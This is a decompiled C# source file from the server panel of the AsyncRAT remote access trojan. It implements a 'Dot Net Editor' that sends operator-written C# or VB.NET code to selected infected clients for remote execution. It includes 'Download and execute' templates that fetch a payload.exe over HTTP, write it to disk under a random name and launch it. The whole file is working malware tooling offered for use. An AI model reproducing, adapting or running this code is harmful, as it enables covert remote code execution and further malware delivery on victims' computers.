using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using FastColoredTextBoxNS;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000088 RID: 136
	public partial class FormDotNetEditor : Form
	{
		// Token: 0x06000368 RID: 872 RVA: 0x00003EE5 File Offset: 0x000020E5
		public FormDotNetEditor()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000369 RID: 873 RVA: 0x00003F0E File Offset: 0x0000210E
		private void FormDotNetEditor_Load(object sender, EventArgs e)
		{
			this.comboLang.SelectedIndex = 0;
			this.comboHelper.SelectedIndex = 1;
		}

		// Token: 0x0600036A RID: 874 RVA: 0x000299D4 File Offset: 0x00027BD4
		private void Button1_Click(object sender, EventArgs e)
		{
			if (this.listBoxReferences.Items.Count == 0 || string.IsNullOrWhiteSpace(this.txtBox.Text))
			{
				return;
			}
			if (!this.txtBox.Text.ToLower().Contains("try") && !this.txtBox.Text.ToLower().Contains("catch"))
			{
				MessageBox.Show("Please add try catch", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			if (Program.form1.listView1.SelectedItems.Count > 0)
			{
				List<string> list = new List<string>();
				foreach (object obj in this.listBoxReferences.Items)
				{
					string item = (string)obj;
					list.Add(item);
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "executeDotNetCode";
				msgPack.ForcePathObject("Option").AsString = this.comboLang.Text;
				msgPack.ForcePathObject("Code").AsString = this.txtBox.Text;
				msgPack.ForcePathObject("Reference").AsString = string.Join(",", list);
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				foreach (object obj2 in Program.form1.listView1.SelectedItems)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(((Clients)((ListViewItem)obj2).Tag).Send), msgPack2.Encode2Bytes());
				}
				MessageBox.Show("Executed!", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				return;
			}
			MessageBox.Show("Selected client = 0", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x0600036B RID: 875 RVA: 0x00029C1C File Offset: 0x00027E1C
		private void ComboLang_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (this.comboLang.SelectedIndex == 0)
			{
				this.txtBox.Language = Language.CSharp;
				this.txtBox.Text = (this.txtBox.Text = this.GetCode(this.comboLang.Text, this.comboHelper.Text));
				return;
			}
			this.txtBox.Language = Language.VB;
			this.txtBox.Text = this.GetCode(this.comboLang.Text, this.comboHelper.Text);
		}

		// Token: 0x0600036C RID: 876 RVA: 0x00003F28 File Offset: 0x00002128
		private void Button2_Click(object sender, EventArgs e)
		{
			this.txtBox.Clear();
		}

		// Token: 0x0600036D RID: 877 RVA: 0x00029CAC File Offset: 0x00027EAC
		private void ComboHelper_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (this.comboHelper.SelectedIndex == 0)
			{
				if (this.comboLang.SelectedIndex == 0)
				{
					this.txtBox.Text = (this.txtBox.Text = (this.txtBox.Text = this.GetCode(this.comboLang.Text, this.comboHelper.Text)));
				}
				else
				{
					this.txtBox.Text = (this.txtBox.Text = this.GetCode(this.comboLang.Text, this.comboHelper.Text));
				}
			}
			if (this.comboHelper.SelectedIndex == 1)
			{
				if (this.comboLang.SelectedIndex == 0)
				{
					this.txtBox.Text = (this.txtBox.Text = this.GetCode(this.comboLang.Text, this.comboHelper.Text));
					return;
				}
				this.txtBox.Text = this.GetCode(this.comboLang.Text, this.comboHelper.Text);
			}
		}

		// Token: 0x0600036E RID: 878 RVA: 0x00029DC8 File Offset: 0x00027FC8
		private string GetCode(string lang, string code)
		{
			if (!(lang == "C#"))
			{
				if (lang == "VB.NET")
				{
					if (code == "Hello world")
					{
						return "Imports System\r\nImports System.Windows.Forms\r\n\r\nNamespace AsyncRAT\r\n    Public Class Program\r\n        Public Shared Sub Main(ByVal args As String())\r\n            Try\r\n                MessageBox.Show(\"Hello World\")\r\n            Catch\r\n            End Try\r\n        End Sub\r\n    End Class\r\nEnd Namespace\r\n\r\n";
					}
					if (code == "Download and execute")
					{
						return "Imports System.Net\r\nImports System.IO\r\nImports System.Diagnostics\r\n\r\nNamespace AsyncRAT\r\n    Public Class Program\r\n        Public Shared Sub Main()\r\n            Try\r\n\r\n                Using wc As WebClient = New WebClient()\r\n\r\n                    Try\r\n                        Dim name As String = Path.GetRandomFileName() & \".exe\"\r\n                        Dim buffer As Byte() = wc.DownloadData(\"http://127.0.0.1/payload.exe\")\r\n                        File.WriteAllBytes(name, buffer)\r\n                        Process.Start(name)\r\n                    Catch\r\n                    End Try\r\n                End Using\r\n\r\n            Catch\r\n            End Try\r\n        End Sub\r\n    End Class\r\nEnd Namespace\r\n\r\n";
					}
				}
			}
			else
			{
				if (code == "Hello world")
				{
					return "using System;\r\nusing System.Windows.Forms;\r\nnamespace AsyncRAT\r\n{\r\n    public class Program\r\n    {\r\n        public static void Main(string[] args)\r\n        {\r\n            try\r\n            {\r\n                MessageBox.Show(\"Hello World\");\r\n            }\r\n            catch { }\r\n        }\r\n    }\r\n}";
				}
				if (code == "Download and execute")
				{
					return "using System.Net;\r\nusing System.IO;\r\nusing System.Diagnostics;\r\n\r\nnamespace AsyncRAT\r\n{\r\n    public class Program\r\n    {\r\n        public static void Main()\r\n        {\r\n            try\r\n            {\r\n                using (WebClient wc = new WebClient())\r\n                {\r\n                    try\r\n                    {\r\n                        string name = Path.GetRandomFileName() + \".exe\";\r\n                        byte[] buffer = wc.DownloadData(\"http://127.0.0.1/payload.exe\");\r\n                        File.WriteAllBytes(name, buffer);\r\n                        Process.Start(name);\r\n                    }\r\n                    catch { }\r\n                }\r\n            }\r\n            catch { }\r\n        }\r\n    }\r\n}\r\n";
				}
			}
			return "";
		}

		// Token: 0x0600036F RID: 879 RVA: 0x00003F35 File Offset: 0x00002135
		private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listBoxReferences.SelectedItems.Count == 1)
			{
				this.listBoxReferences.Items.Remove(this.listBoxReferences.SelectedItem);
			}
		}

		// Token: 0x06000370 RID: 880 RVA: 0x00029E40 File Offset: 0x00028040
		private void AddToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Add Reference", "References", "", -1, -1);
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			//using (IEnumerator enumerator = this.listBoxReferences.Items.GetEnumerator())
			//{
			//	while (enumerator.MoveNext())
			//	{
			//		if ((string)enumerator.Current == text)
			//		{
			//			return;
			//		}
			//	}
			//}
			this.listBoxReferences.Items.Add(text);
		}

		// Token: 0x06000371 RID: 881 RVA: 0x00029ED4 File Offset: 0x000280D4
		private void Button3_Click(object sender, EventArgs e)
		{
			if (this.listBoxReferences.Items.Count == 0 || string.IsNullOrWhiteSpace(this.txtBox.Text))
			{
				return;
			}
			if (!this.txtBox.Text.ToLower().Contains("try") && !this.txtBox.Text.ToLower().Contains("catch"))
			{
				MessageBox.Show("Please add try catch", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			List<string> list = new List<string>();
			foreach (object obj in this.listBoxReferences.Items)
			{
				string item = (string)obj;
				list.Add(item);
			}
			string text = this.comboLang.Text;
			if (text == "C#")
			{
				this.Compiler(new CSharpCodeProvider(this.providerOptions), this.txtBox.Text, string.Join(",", list).Split(new string[]
				{
					","
				}, StringSplitOptions.RemoveEmptyEntries));
				return;
			}
			if (!(text == "VB.NET"))
			{
				return;
			}
			this.Compiler(new VBCodeProvider(this.providerOptions), this.txtBox.Text, string.Join(",", list).Split(new string[]
			{
				","
			}, StringSplitOptions.RemoveEmptyEntries));
		}

		// Token: 0x06000372 RID: 882 RVA: 0x0002A050 File Offset: 0x00028250
		private void Compiler(CodeDomProvider codeDomProvider, string source, string[] referencedAssemblies)
		{
			try
			{
				new Dictionary<string, string>().Add("CompilerVersion", "v4.0");
				string compilerOptions = "/target:winexe /platform:anycpu /optimize-";
				CompilerParameters options = new CompilerParameters(referencedAssemblies)
				{
					GenerateExecutable = true,
					GenerateInMemory = true,
					CompilerOptions = compilerOptions,
					TreatWarningsAsErrors = false,
					IncludeDebugInformation = false
				};
				CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(options, new string[]
				{
					source
				});
				if (compilerResults.Errors.Count > 0)
				{
					//using (IEnumerator enumerator = compilerResults.Errors.GetEnumerator())
					//{
					//	if (enumerator.MoveNext())
					//	{
					//		CompilerError compilerError = (CompilerError)enumerator.Current;
					//		MessageBox.Show(string.Format("{0}\nLine: {1}", compilerError.ErrorText, compilerError.Line), "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					//	}
					//	goto IL_DD;
					//}
				}
				MessageBox.Show("No Error!", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				IL_DD:;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
		}

		// Token: 0x040002A6 RID: 678
		private Dictionary<string, string> providerOptions = new Dictionary<string, string>
		{
			{
				"CompilerVersion",
				"v4.0"
			}
		};
	}
}
